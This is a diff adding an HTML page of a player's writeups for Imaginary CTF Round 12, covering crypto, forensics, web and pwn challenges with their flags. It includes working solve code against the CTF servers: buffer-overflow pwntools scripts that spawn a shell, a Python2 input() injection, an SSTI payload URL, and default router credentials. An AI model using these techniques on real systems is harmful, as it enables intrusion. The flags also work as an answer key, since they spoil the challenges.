@@ -1,0 +1,761 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/styles/an-old-hope.min.css">
+    <link rel="icon" href="https://i.imgur.com/wQxv5zm.png" type="image/gif" sizes="16x16">
+    <title>Max49 Imaginary CTF Round 12 Writeups</title>
+    <meta content="Imaginary CTF Writeups" property="og:site_name">
+    <meta content="Max49 Imaginary CTF Round 12 Writeups" property="og:title">
+    <meta content="Writeups for Round 12 of Imaginary CTF!" property="og:description">
+    <meta content="https://www.google.com/" property="og:url">
+    <meta content="https://i.imgur.com/wQxv5zm.png" property="og:image">
+    <meta content="#000000" data-react-helmet="true" name="theme-color">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6"
+    crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width">
+    <link href="/static/writeups.css?q={{ num }}" rel="stylesheet" type="text/css">
+  </head>
+  <body>
+    <script src="/static/js/main.js"></script>
+    <script src="/static/js/writeups10.js?q={{ num }}"></script>
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <div class="jumbotron text-center">
+      <img class="pfp" src="https://i.imgur.com/wQxv5zm.png" height="150px" width="auto" />
+      <h1>Max49's ICTF Round 12 Challenge Writeups</h1>
+      <p>Color Key (by point value, not by me): Green = Easy, Yellow = Easy/Medium, Orange = Medium, Red = Hard</p>
+      <p>NOTE: On my "guessy" scale, a 1 and a 2 are basically the same. Additionally, in this round, a source provided does not necessary mean there's no guess factor.</p>
+    </div>
+
+    <img style="position: fixed; bottom: 0; right: 0; border: 0; padding: 20px;" id="imgClickAndChange" height="100px" width="auto" src="https://www.jing.fm/clipimg/full/132-1327227_moon-clipart-moon-clipart-black-and-white-half.png" onclick="changeImage()" alt="" draggable="false"/>
+    
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Sanity Check Round 12</h3>
+          <p>Welcome to Round 12! DM flags to me to get points, and rise up on the leaderboard! Have fun and enjoy Round 12!</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">ictf{Round_12_Sanity_Check}</span></p>
+          <h5>Category</h5>
+          <p>Misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Board</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>15</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>For this Sanity Check, you were just give the flag in the attachments section.</p>
+          <p><b>Difficulty rating:</b> 0/10</p>
+          <p><b>Guessy rating:</b> 0/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{Round_12_Sanity_Check}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>smth here</h3>
+          <p>smth here</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">:4E7L6oD*049p==b?8b=D07EHN</span></p>
+          <h5>Category</h5>
+          <p>smth here</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>enter name here</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>30</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>This was just ez ROT47 <strike>(because someone forgot to approve a chall)</strike>. I used CyberChef to get the flag.</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{e@sY_chAll3ng3ls_ftw}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Slow internet</h3>
+          <p>My friend got me a cool business router for my birthday, but I don't know the login information so I can't set it up. Could you help me out and log into my router as admin?</p>
+          <p>Note: this is a "default business router"</p>
+          <h5>Attachments</h5>
+          <p><a href="https://router.max49.repl.co/" target="_blank">https://router.max49.repl.co/</a></p>
+          <h5>Category</h5>
+          <p>Web, OSINT</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Max49</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>50</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Intended Solve:</h3>
+          <p>This chall could be solved by just googling "default business router login" and using the Xfinity default business gateway login information (cusadmin:CantTouchThis or cusadmin:highspeed). Inputting one of these login combinations yields the flag.</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{w3b_and_0s1nt???_gr3at_c0mb0!}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Quintessentially Quick Quiche</h3>
+          <p>Try out a new HTTP protocol version!</p>
+          <h5>Attachments</h5>
+          <p><a href="https://quiche.tirefire.org/" target="_blank">https://quiche.tirefire.org/</a></p>
+          <h5>Category</h5>
+          <p>Web</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Tirefire</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>50</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>I just got the flag by refreshing the page. I didn't understand at the time, but I learned that this is because most moder browsers use http/2 on the first loading of a webpage and then switch to http/3 on the second loading of the webpage.</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{who_knew_http_over_udp_could_be_so_quic(k)}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Caesar Tart</h3>
+          <p>My friend sent me a message with a flag inside. More importantly, it also speaks about apple tarts. To test your dedication about apple tarts, I made a fancy caesar cipher to encrypt it. Retrieve the flag and hail the tarts!<br />Note: flag format is ictf{ALLCAPSNOUNDERSCORE}</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/40CD-caesartart.py" target="_blank">https://imaginaryctf.org/r/40CD-caesartart.py</a></p>
+          <h5>Category</h5>
+          <p>Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>A~Z</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>In this chall, we're given the python file used to make the encoded flag as well as the encoded flag. We're also given the hint of "caesar". We know this is not a ceasar cipher because running though all the possible combination yields no plaintext. Doing some more googling shows us the vigenere cipher, an encryption method using multiple interwoven caesar ciphers based on a key. We can bruteforce a key using <a href="https://www.dcode.fr/vigenere-cipher" target="_blank">dcode</a> and we can recover the plaintext, at the end of which is the flag.</p>
+          <p><b>Difficulty rating:</b> 2/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{MORELIKEVIGENERETART}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Glitchy Video</h3>
+          <p>My friend said that they sent me something. I was expecting a flag, but all I got was this audio file - maybe you could take a <i>look</i>?</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/590C-steg2.wav" target="_blank">https://imaginaryctf.org/r/590C-steg2.wav</a></p>
+          <h5>Category</h5>
+          <p>Forensics</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>fbibad</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Given the .wav file, I opened up Audacity to try to inspect the audio further and got the ROT13'd flag by opening up the spectrogram. The real flag could be uncovered by running ROT13 on the ciphertext (I used CyberChef).</p>
+          <p><img src="https://i.imgur.com/ySR1pgU.png" alt="Picture of spectrogram" width="100%"/></p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{34sy_4ud10_st3g4n0gr4phy}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Web Flagchecker</h3>
+          <p>I make too many reversing challenges, because flagcheckers are easy. I thought I should expand my horizons, so I made a web challenge.</p>
+          <h5>Attachments</h5>
+          <p><a href="http://puzzler7.imaginaryctf.org:4000/" target="_blank">http://puzzler7.imaginaryctf.org:4000/</a></p>
+          <h5>Category</h5>
+          <p>Web</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          {% raw %}
+          <h3>Solve:</h3>
+          <p>This chall actually involves a little bit of thinking. Upon going to the website, we see the source and see that we need to get the flag somehow in /check. Based on the conditions and the format of the /check code, it seems unlikely that we would be able to bruteforce a flag. What we do see though is <span class="pre">render_template_string()</span>, which can have the Server Side Template Injection, or SSTI, vulnerabilty. In Flask, two curly braces indicate variables that can be placed into the html (ex. <span class="pre">{{ variable }}</span>). We know that from the source that the flag is located in the flag variable, so we need to find a way to get this to the /check page. First, though, I wanted to get the length of the flag, so I ran this script to know the flag was 20 chars long (The output wasn't "Bad length!" at 14 chars on the inside of the flag):</p>
+          <pre>
+            <code class="python">
+import os
+for i in range(25):
+    print(f"{i+1} chars")   
+    os.system("curl http://puzzler7.imaginaryctf.org:4000/check?flag=ictf\\\{" + "a"*(i+1) + "\\\}")
+    print("")
+            </code>
+          </pre>
+          <p>After this, all that was left was to craft an argument that would yield the flag. This was my final URL: <a href="http://puzzler7.imaginaryctf.org:4000/check?flag=ictf{%20%20%20%20%20%20%22,flag%2B%22}" target="_blank">http://puzzler7.imaginaryctf.org:4000/check?flag=ictf{%20%20%20%20%20%20%22,flag%2B%22}</a>, which when decoded and put into the the render_template_string() gives us the flag.</p>
+          {% endraw %}
+          <p><b>Difficulty rating:</b> 3/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{@llth3br@ck3t5}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>overflowwwwwwwww</h3>
+          <p>Bored?</p>
+          <a href="https://discord.com/channels/732308165265326080/814218925226065950/824869040056041502" target="_blank" class="biglink">https://discord.com/channels/732308165265326080/814218925226065950/824869040056041502</a>
+          <p>Connect with <span class="pre">nc oreos.imaginaryctf.org 7331</span>.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/D199-overflowwwwwwwww" target="_blank">https://imaginaryctf.org/r/D199-overflowwwwwwwww</a></p>
+          <h5>Category</h5>
+          <p>Pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Eth007</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>By inspecting the binary psuedocode, we can see that we need to overflow a buffer, but this buffer is malloc() rather than just square brackets. We need to get the value of *p1var1 (according to the pseudocode) to equal 0x13371337, so we need to carefully construct this buffer overflow in order to change this variable. So with malloc(), some metadata is inserted around the 0x40 (64) buffer (8 bytes before and after), so in total, we need 80 characters of filler before we can insert the new variable. Here was my final script (once you get shell, the flag is in flag.txt):</p>
+          <pre>
+            <code class="python">
+from pwn import *
+p = remote('oreos.imaginaryctf.org', 7331)
+p.recvline()
+payload = b"A"*80 + p64(0x13371337)
+p.sendline(payload)
+p.interactive()
+            </code>
+          </pre>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <h5>Flag:&nbsp;&nbsp;</h5><br />
+        <div class="flag" style="padding-top: 0px">
+          <p>ictf{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_h34p_c4n_b3_0v3rfl0w3d_t00}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>how r u</h3>
+          <p>how are you today? here is a challenge.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/518A-how_r_u.py" target="_blank">https://imaginaryctf.org/r/518A-how_r_u.py</a>, <span class="pre">nc stephencurry.imaginaryctf.org 5005</span></p>
+          <h5>Category</h5>
+          <p>Misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Artemis37</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Python2 has a vulnerability with input() where you can basically just input anything you want and it'll exexute it, so inputting <span class="pre">__import("os")__.system("cat flag.txt")</span> on the server gives you the flag.
+          </p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{n3v3r_3v3r_3v3r_3v3r_u53_1npu7_1n_pyth0n2}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Password Recovery Pt. 1</h3>
+          <p>We managed to recover this mailbox file from the remote server 'Twister' at Password Recovery, Inc.'s corporate offices.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/147B-password.recovery.mbox" target="_blank">https://imaginaryctf.org/r/147B-password.recovery.mbox</a></p>
+          <h5>Category</h5>
+          <p>Cryptography</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>StealthyDev</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>100</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So to solve this, I had originally downloaded an mbox viewer, but then I realized that I could just open the file like a txt file and I was file doing that. Looking at the emails, we see a bunch of "randomly" generated passwords encoded in base64. From the description, we can just look up "twister cryptography" and we see the mersenne twister. Looking up past ctf challs that involve this, we can see that there already exists a python package to predict next values given enough of a pattern. So to solve this chall using the function in the latest email and past writeups, I made this script (email.txt is the .mbox file without the first and last email):</p>
+          <pre>
+            <code class="python">
+from base64 import b64decode
+from mt19937predictor import MT19937Predictor
+predictor = MT19937Predictor()
+file = open('email.txt', 'r').readlines()
+count = 0
+passAt = 16
+passwords = []
+for line in file:
+    count += 1
+    if(count == passAt):
+        passwords.append(line.strip())
+        passAt += 19
+for password in passwords:
+    predictor.setrandbits(int.from_bytes(b64decode(password)[:4], 'big'), 32)
+    predictor.setrandbits(int.from_bytes(b64decode(password)[4:], 'big'), 32)
+flag = b""
+for i in range(10):
+    nextrand = predictor.getrandbits(32)
+    flag += int.to_bytes(nextrand, 4, 'big')
+print(flag.decode())
+            </code>
+          </pre>              
+          <p><b>Difficulty rating:</b> 4/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{Pr3d1ct_M3rs3nn3_By_S3tt1ng_St4t3}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>ICICLE Jail</h3>
+          <p>What happens when the CEO of a law firm specializing in last wills becomes a hacker?</p>
+          <p>I set up this modified ICICLE interpreter (check the spec for new I/O instructions!) for a challenge, but I lost my credentials. I know I left them in flag.txt, but ... I put some restrictions on the interpreter so no one could steal my credentials. Can you get them for me?</p>
+          <h5>Attachments</h5>
+          <p>
+            <span class="pre">nc puzzler7.imaginaryctf.org 9999</span><br />
+            <a href="https://imaginaryctf.org/r/DEB8-icicle.py" target="_blank">https://imaginaryctf.org/r/DEB8-icicle.py</a><br />
+            <a href="https://imaginaryctf.org/r/CF93-pwn.py" target="_blank">https://imaginaryctf.org/r/CF93-pwn.py</a><br />
+            <a href="https://imaginaryctf.org/r/E92A-spec_v3.md" target="_blank">https://imaginaryctf.org/r/E92A-spec_v3.md</a>
+          </p>
+          <h5>Category</h5>
+          <p>Pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So for this chall, we get one line to try to get the flag. Looking at the spec, we see that we can use readf to read files, which is what we want to do, but there's a filter blacklisting words like "read", "flag", "txt", etc., so we can't just directly read flag.txt. In the spec, we also see exec, which executed icicle code, but we can input an int and it'll convert it using intstr. We can use the strint method to convert <span class="pre">readf r1, "flag.txt"</span> to an int and exec it, but if we input this, we don't get an output. If we add a newline in our conversions to int (ascii --> hex --> decimal) and add tpr r1, we get <span class="pre">exec 183827312370185651168152020034418275188078876928815084123222577</span> and inputting this into the server gives us the flag.</p> 
+          <p><b>Difficulty rating:</b> 5/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{3x3cut!v3_3x3cu+0r_3x3cut3s_3x3c}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Too Old</h3>
+          <p>I've used one of the oldest & weakest PRNG to cipher this message. Could you decipher it?</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/8641-old.py" target="_blank">https://imaginaryctf.org/r/8641-old.py</a></p>
+          <h5>Category</h5>
+          <p>Crypto/Programming</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>fbibad/puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Looking up old PRNGs on Wikipedia shows us the "Middle square method", which by Wikipedia's pseudocode seems to be what is happening in this script. The challenge for this chall, though, was reversing the output into a flag. I was able to do that through this script (get_key() is meant to retrieve the starting key by going through every possible number until that number, when ran through the middle square method, gives the bytes in the output text. The next part of the script is meant to use that starting key to go through every possible letter and test them against the output bytes to get the flag.):</p> 
+          <p><a href="/static/middle.py" download>Download my solve script!</a> (Too wide to post here without flexboxes getting messed up :rooNoBooli:)</p>
+          <p><b>Difficulty rating:</b> 5/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{f0r_l00p5_r1ght_th3r3_4nd_3v3ryWh3r3}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>smells Like Stereo Bits</h3>
+          <p>With the lights out, it's less dangerous<br />Here we are now, entertain us<br />I feel stupid, and contagious<br />Here we are now, entertain us</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/CDE6-smells_Like_Stereo_Bits.jpg" target="_blank">https://imaginaryctf.org/r/CDE6-smells_Like_Stereo_Bits.jpg</a></p>
+          <h5>Category</h5>
+          <p>Steganography</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>StealthyDev</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>100</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Running zsteg on this image gives some text, but nothing useful. Looking at this image, we see that the left side looks like water, but as the image progresses right, the water becomes more and more distorted, especially around the middle. To me, this kind of looked like a stereogram, or magic eye, so I ran it through a stereogram solver and actually recovered some text: <span class="pre">G1R12B0</span>. With the hint "LSB" from the capitalized letters in the title, we can assume we need to extract the least significant bit. I used stegonline to do this, pressing Extract Files/Data, Checking 1 and 2 above R, 1 above G, and 0 above B. I then set the bit plane order to GRB as in the stereogram text. Trying to extract it with LSB returns nothing (strange), but extracting it with MSB gives us a jpg with the flag.</p> 
+          <p><b>Difficulty rating:</b> 3/10</p>
+          <p><b>Guessy rating:</b> 3/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{90s_st3r30grams_r_k3wl}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>ovvvvvvvvvverflow</h3>
+          <p>More pwn. Ash might like this challenge. Connect with <span class="pre">nc oreos.imaginaryctf.org 8888</span>.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/565C-ovvvvvvvvvverflow" target="_blank">https://imaginaryctf.org/r/565C-ovvvvvvvvvverflow</a></p>
+          <h5>Category</h5>
+          <p>Pwn</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Eth007</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Opening up the binary in ghidra tells us that we need to overflow a 10 char buffer to change a variable which is executed on the system. The original value, 0x7461642f6e69622f, is equal to /tad/nib/, which when reversed is /bin/dat (/bin/date when the next variable is added on). To solve this chall, I reversed /bin/sh and turned it into hex and then wrote a short script to get me shell with this:</p>
+          <pre>
+            <code class="python">
+from pwn import *
+p = remote('oreos.imaginaryctf.org', 8888)
+p.recv()
+p.sendline(b'A'*10 + p64(0x68732f6e69622f))
+p.interactive()
+            </code>
+          </pre>
+          <p>After the fact, I found out that could've done <span class="pre">b'A'*10 + b'/bin/sh'</span> instead of turning it into hex and then I found out that I didn't need to use pwntools at all and could've just sent <span class="pre">aaaaaaaaaash</span> to get shell.</p>
+          <p><b>Difficulty rating:</b> 1/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <h5>Flag:&nbsp;&nbsp;</h5><br />
+        <div class="flag">
+          <p>ictf{aAAaAAaaaAAAaaAAAaaAaaAaAAaaAAaAaAaaAAaaaAaAAAAAaAAaAAaAAAaAAAaash}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="medium chall">
+          <h3>Regular Reversing</h3>
+          <p>Why mince words?</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">^ictf{(?=.*4.0.*R.*G.*)(?=.*(?=\d\D{6}\d.+\d{2}\D\d.$))(?=[^}]{42}5}$)(?=.+\Dn0\D(?:.*[A-Z][2-8][A-Z]){1,}.*\D4r.[^_]+$)(?=.*u.{5}u.+ss[n0-5]+})(?=(?=[NC0-9]{3}\W).*(?=[ale].._[n-x301]{10}.{2}$))(?=[^689ABDEFH-MO-QS-Z]{43})(?=(?:[^_]+_){6}[^_]+})(?=[A-Z4]+'[b-w_0-7]+\+[l-xG_R0-5]+.$)(?=[C3P0]+4[NSA].[7of9]_.+_[um]+[abc][help](?:_[^_]{5}.*){3}})(?=.+\w\w\dw(?:_\d_).*(?=.3[r4-9_xp]{3}3\w{2}[15][40].{2}}))(?=.+\D2.[mango][rum][hooch]+\w\d.{13}\dxp[^_xp]{9})(?=.{5}_[ak47].*\db\d.+\+_[D-Z3]{3}[BuMP69][l4ser]{3,6}).*}$</span></p>
+          <h5>Category</h5>
+          <p>Reversing</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>StealthyDev</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>125</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Just looking at the attachment, we can see that it's a bunch of regex with only one case that would match it, the flag. I used regex101 to solve this chall because I find that this website gives a bunch of useful information when trying to match regex. My method of solving this wasn't very organized and consisted mainly of trying to match one positive lookahead and then adding more onto it and consistently trying to match them. StealthyDev was very helpful in the support ticket and mainly helped just debug my flag and find out why certain cases weren't working. All in all, I found it was easier to make the flag near the end of the flag near the closing brace and then work my way to the front. Overall, great chall that taught me more about regex!</p>
+          <p><b>Difficulty rating:</b> 6/10</p>
+          <p><b>Guessy rating:</b> 1/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br /><br />
+          <p>ictf{C4N'7_kn0w_2_much_4b0u+_R3Gul4r_3xpr3ss10n5}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="medium chall">
+          <h3>Password Recovery Pt. 2</h3>
+          <p>We managed to recover another mailbox file from 'Twister' at Password Recovery, Inc.'s corporate offices. Password generation has not changed, but it seems they no longer always mail out the new passwords. Some incidents sent the passwords via MMS and we no longer know what they were. I bet if we could figure out what had been texted to michael@michaelscottpaper.company, we could find the next flag.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/A10D-password.recovery.mbox">https://imaginaryctf.org/r/A10D-password.recovery.mbox</a></p>
+          <h5>Category</h5>
+          <p>Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>StealthyDev</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>125</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Unsolved</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Reversing Some Algorithms</h3>
+          <p>I've found some algorithms, so naturally, I made them into a flagchecker. Reverse them and get a flag.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/4F2F-chall.py">https://imaginaryctf.org/r/4F2F-chall.py</a></p>
+          <h5>Category</h5>
+          <p>Reversing/Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>100</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Unsolved</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="medium chall">
+          <h3>Puzzle</h3>
+          <p>I made a game for everyone that is planning on voting me for president!<br />It's an impossible level that only people with an IQ bigger than 9000 can solve!</p>
+          <p>NOTE: Flag format is ICTF{*+} (all uppercase)</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/9A4D-puzzle.zip">https://imaginaryctf.org/r/9A4D-puzzle.zip</a></p>
+          <h5>Category</h5>
+          <p>Game Hacking</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Et3rnos</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>125</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
